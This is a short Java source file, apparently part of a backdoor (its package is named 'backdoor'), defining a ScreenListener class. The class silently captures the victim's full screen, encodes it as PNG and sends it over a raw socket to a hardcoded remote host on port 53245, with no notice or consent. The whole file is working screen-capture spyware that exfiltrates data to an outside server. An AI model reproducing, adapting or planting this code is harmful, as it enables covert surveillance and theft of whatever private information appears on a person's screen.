package net.GingkoTreeX.backdoor;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ScreenListener {
    private static final int PORT = 53245;
    private static final String SERVER_ADDRESS = "bj.s2.6net.plus";

    public static void sendScreenshot() {
        try {
            // 获取全屏截图
            Robot robot = new Robot();
            BufferedImage screenshot = robot.createScreenCapture(new Rectangle(ScreenUtil.getScreenSize()));

            // 转换为字节数组
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            ImageIO.write(screenshot, "PNG", outputStream);
            byte[] imageData = outputStream.toByteArray();

            // 发送到服务器
            try (Socket socket = new Socket(SERVER_ADDRESS, PORT)) {
                OutputStream out = socket.getOutputStream();
                out.write(imageData);
                out.flush();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
class ScreenUtil {
    public static Dimension getScreenSize() {
        Toolkit toolkit = Toolkit.getDefaultToolkit();
        return toolkit.getScreenSize();
    }
}
